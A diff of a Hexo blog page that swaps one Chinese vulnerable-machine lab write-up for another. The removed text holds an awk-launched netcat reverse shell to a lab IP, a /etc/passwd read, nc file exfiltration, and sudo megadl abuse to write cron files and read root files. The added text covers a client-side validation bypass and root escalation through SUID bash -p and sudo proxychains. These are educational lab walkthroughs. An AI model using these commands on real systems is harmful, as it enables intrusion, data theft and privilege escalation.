@@ -19,36 +19,33 @@
   <meta name="author" content="XCDH">
   <meta name="keywords" content="">
   
-    <meta name="description" content="一.端口扫描： 二.目录扫描： 三.漏洞测试与利用：Web的index.php页面：是一个php的信息页面。  访问learning.php页面，进行漏洞测试：  awk指令可以执行系统命令：awk ‘BEGIN {system(“ls”)}’  awk指令也可以读文件：awk ‘&#x2F;&#x2F;‘ “&#x2F;etc&#x2F;passwd”  使用执行系统命令的方式，反弹一下shel">
+    <meta name="description" content="一.信息收集： 二.漏洞测试：进入Web界面：需要完成1000次，才能成功，要玩游戏的话显然我是不可能玩的哈哈。  查看源代码：  发现是前端验证，用bp抓一下相应包进行绕过。 再点击发送请求包，就会得到相应包。修改相应包，在发包，自己在跳一下，就成功了编辑成功获取账号密码：  三.提权:使用ssh进行登录一进去就可以发现一个suid的bash文件（是welcome用户的）  bash -p（启动">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Awk靶机复盘">
-<meta property="og:url" content="http://example.com/2025/05/21/Awk%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/index.html">
+<meta property="og:title" content="Wudi靶机复盘">
+<meta property="og:url" content="http://example.com/2025/05/20/Wudi%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/index.html">
 <meta property="og:site_name" content="XCDH">
-<meta property="og:description" content="一.端口扫描： 二.目录扫描： 三.漏洞测试与利用：Web的index.php页面：是一个php的信息页面。  访问learning.php页面，进行漏洞测试：  awk指令可以执行系统命令：awk ‘BEGIN {system(“ls”)}’  awk指令也可以读文件：awk ‘&#x2F;&#x2F;‘ “&#x2F;etc&#x2F;passwd”  使用执行系统命令的方式，反弹一下shel">
+<meta property="og:description" content="一.信息收集： 二.漏洞测试：进入Web界面：需要完成1000次，才能成功，要玩游戏的话显然我是不可能玩的哈哈。  查看源代码：  发现是前端验证，用bp抓一下相应包进行绕过。 再点击发送请求包，就会得到相应包。修改相应包，在发包，自己在跳一下，就成功了编辑成功获取账号密码：  三.提权:使用ssh进行登录一进去就可以发现一个suid的bash文件（是welcome用户的）  bash -p（启动">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160525036.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160602034.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160525036.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160629875.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160639472.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160648234.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160656026.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160715416.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160725634.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160733244.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160759540.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160811088.png">
-<meta property="og:image" content="https://kcide.asia/PicGo/20250521160821843.png">
-<meta property="article:published_time" content="2025-05-21T07:56:16.000Z">
-<meta property="article:modified_time" content="2025-05-21T08:25:16.571Z">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521210941496.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521211115886.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521211138091.png">
+<meta property="og:image" content="c:\Users\HW\AppData\Roaming\Typora\typora-user-images\image-20250521211205850.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521211220155.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521211240271.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521211304845.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521211524545.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521212149137.png">
+<meta property="og:image" content="https://kcide.asia/PicGo/20250521212339481.png">
+<meta property="article:published_time" content="2025-05-20T04:56:16.000Z">
+<meta property="article:modified_time" content="2025-05-21T13:30:28.578Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="复盘">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://kcide.asia/PicGo/20250521160525036.png">
+<meta name="twitter:image" content="https://kcide.asia/PicGo/20250521210941496.png">
   
   
   
-  <title>Awk靶机复盘 - XCDH</title>
+  <title>Wudi靶机复盘 - XCDH</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -214,7 +211,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Awk靶机复盘"></span>
+            <span id="subtitle" data-typed-text="Wudi靶机复盘"></span>
           
         </div>
 
@@ -225,8 +222,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-05-21 15:56" pubdate>
-          2025年5月21日 下午
+        <time datetime="2025-05-20 12:56" pubdate>
+          2025年5月20日 下午
         </time>
       </span>
     
@@ -237,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          360 字
+          276 字
         
       </span>
     
@@ -248,7 +245,7 @@
         
         
         
-          4 分钟
+          3 分钟
         
       </span>
     
@@ -289,48 +286,30 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Awk靶机复盘</h1>
+            <h1 id="seo-header">Wudi靶机复盘</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="一-端口扫描："><a href="#一-端口扫描：" class="headerlink" title="一.端口扫描："></a>一.端口扫描：</h2><p><img src="https://kcide.asia/PicGo/20250521160525036.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="二-目录扫描："><a href="#二-目录扫描：" class="headerlink" title="二.目录扫描："></a>二.目录扫描：</h2><p><img src="https://kcide.asia/PicGo/20250521160602034.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="三-漏洞测试与利用："><a href="#三-漏洞测试与利用：" class="headerlink" title="三.漏洞测试与利用："></a>三.漏洞测试与利用：</h2><p>Web的index.php页面：是一个php的信息页面。</p>
-<p><img src="https://kcide.asia/PicGo/20250521160525036.png" srcset="/img/loading.gif" lazyload></p>
-<p>访问learning.php页面，进行漏洞测试：</p>
-<p><img src="https://kcide.asia/PicGo/20250521160629875.png" srcset="/img/loading.gif" lazyload></p>
-<p>awk指令可以执行系统命令：awk ‘BEGIN {system(“ls”)}’</p>
-<p><img src="https://kcide.asia/PicGo/20250521160639472.png" srcset="/img/loading.gif" lazyload></p>
-<p>awk指令也可以读文件：awk ‘&#x2F;&#x2F;‘ “&#x2F;etc&#x2F;passwd”</p>
-<p><img src="https://kcide.asia/PicGo/20250521160648234.png" srcset="/img/loading.gif" lazyload></p>
-<p>使用执行系统命令的方式，反弹一下shell</p>
-<blockquote>
-<p>awk ‘BEGIN {system(“rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.226.222 4444 &gt;&#x2F;tmp&#x2F;f”)}’</p>
-</blockquote>
-<p><img src="https://kcide.asia/PicGo/20250521160656026.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" srcset="/img/loading.gif" lazyload alt="点击并拖拽以移动">稳定shell：</p>
-<blockquote>
-<p>python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’<br> curl + z<br> stty raw -echo;fg<br> reset<br> xterm</p>
-</blockquote>
-<h2 id="四-提权"><a href="#四-提权" class="headerlink" title="四.提权:"></a>四.提权:</h2><p>进入welcome用户目录：发现了一个WEP-capture.pcap的无线网络数据包，还有一个flag，但是现在还没有权限打开。</p>
-<p><img src="https://kcide.asia/PicGo/20250521160715416.png" srcset="/img/loading.gif" lazyload></p>
-<p>WEP:是在无线网络通信中对数据进行封装和加密的过程802.11<br> 用到了aircrack-ng工具：</p>
-<p>使用nc命令将数据给传过来：</p>
-<blockquote>
-<p>靶机：nc 192.168.226.222 1234 &lt; WEP-capture.pcap</p>
-<p> kali：nc -lvp 1234 &gt; WEP.pcap</p>
-</blockquote>
-<p><img src="https://kcide.asia/PicGo/20250521160725634.png" srcset="/img/loading.gif" lazyload></p>
-<blockquote>
-<p>aircrack-ng  WEP.pcap</p>
-</blockquote>
-<p><img src="https://kcide.asia/PicGo/20250521160733244.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" srcset="/img/loading.gif" lazyload alt="点击并拖拽以移动">获取到了welcome的密码su welcome进行切换用户，sudo -l查看一下，看到了可利用点<img src="https://kcide.asia/PicGo/20250521160759540.png" srcset="/img/loading.gif" lazyload></p>
-<p>megadl命令：<br>   写入文件：<br>   sudo megadl <a target="_blank" rel="noopener" href="https://mega.nz网址的链接(只能是这个网址,外网)/">https://mega.nz网址的链接（只能是这个网址，外网）</a> –proxy&#x3D;外网代理地址   –path&#x3D;&#x2F;etc&#x2F;cron.d&#x2F;a                注意：path是计划任务的路径，也可以写别的。<br>   读取文件：<br>   sudo megadl –config&#x3D;&#x2F;root&#x2F;root.txt<br>   sudo megadl –config&#x3D;&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</p>
-<p>获取了flag：<img src="https://kcide.asia/PicGo/20250521160811088.png" srcset="/img/loading.gif" lazyload></p>
-<p>编辑获取到了root的密码：</p>
-<p><img src="https://kcide.asia/PicGo/20250521160821843.png" srcset="/img/loading.gif" lazyload></p>
+                <h2 id="一-信息收集："><a href="#一-信息收集：" class="headerlink" title="一.信息收集："></a>一.信息收集：</h2><p><img src="https://kcide.asia/PicGo/20250521210941496.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="二-漏洞测试："><a href="#二-漏洞测试：" class="headerlink" title="二.漏洞测试："></a>二.漏洞测试：</h2><p>进入Web界面：需要完成1000次，才能成功，要玩游戏的话显然我是不可能玩的哈哈。</p>
+<p><img src="https://kcide.asia/PicGo/20250521211115886.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看源代码：</p>
+<p><img src="https://kcide.asia/PicGo/20250521211138091.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现是前端验证，用bp抓一下相应包进行绕过。<img src="C:\Users\HW\AppData\Roaming\Typora\typora-user-images\image-20250521211205850.png" srcset="/img/loading.gif" lazyload alt="image-20250521211205850"></p>
+<p>再点击发送请求包，就会得到相应包。修改相应包，在发包，自己在跳一下，就成功了编辑成功获取账号密码：</p>
+<p><img src="https://kcide.asia/PicGo/20250521211220155.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权:"></a>三.提权:</h2><p>使用ssh进行登录一进去就可以发现一个suid的bash文件（是welcome用户的）</p>
+<p><img src="https://kcide.asia/PicGo/20250521211240271.png" srcset="/img/loading.gif" lazyload></p>
+<p>bash -p（启动一个特权模式的 shell）进行查看flag</p>
+<p><img src="https://kcide.asia/PicGo/20250521211304845.png" srcset="/img/loading.gif" lazyload></p>
+<p>将kali的公钥写到靶机中，使用kali免密登录一下</p>
+<p><img src="https://kcide.asia/PicGo/20250521211524545.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用sudo -l 就可以查看到一个SUDO权限的文件（是一个可以直接执行程序），在 ProxyChains 后面加入 bash 命令。ProxyChains 能强制让后续程序通过代理执行，bash 作为 shell 可以执行各种脚本和命令。成功获取了root权限</p>
+<p><img src="https://kcide.asia/PicGo/20250521212149137.png" srcset="/img/loading.gif" lazyload></p>
+<p>rootflag:</p>
+<p><img src="https://kcide.asia/PicGo/20250521212339481.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="四-总结："><a href="#四-总结：" class="headerlink" title="四.总结："></a>四.总结：</h2><p>这个靶机主要就是前端的绕过，以及后续的提权，是个非常简单的靶机</p>
 
                 
               </div>
@@ -376,8 +355,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Awk靶机复盘</div>
-      <div>http://example.com/2025/05/21/Awk靶机复盘/</div>
+      <div>Wudi靶机复盘</div>
+      <div>http://example.com/2025/05/20/Wudi靶机复盘/</div>
     </div>
     <div class="license-meta">
       
@@ -389,7 +368,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年5月21日</div>
+          <div>2025年5月20日</div>
         </div>
       
       
@@ -421,9 +400,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/05/21/Commit%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/" title="Commit靶机复盘">
+                      <a href="/2025/05/21/Awk%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/" title="Awk靶机复盘">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Commit靶机复盘</span>
+                        <span class="hidden-mobile">Awk靶机复盘</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -431,8 +410,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/05/20/Wudi%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%9B%98/" title="Wudi靶机复盘">
-                        <span class="hidden-mobile">Wudi靶机复盘</span>
+                      <a href="/2025/05/18/my-first-blog/" title="my-first-blog">
+                        <span class="hidden-mobile">my-first-blog</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
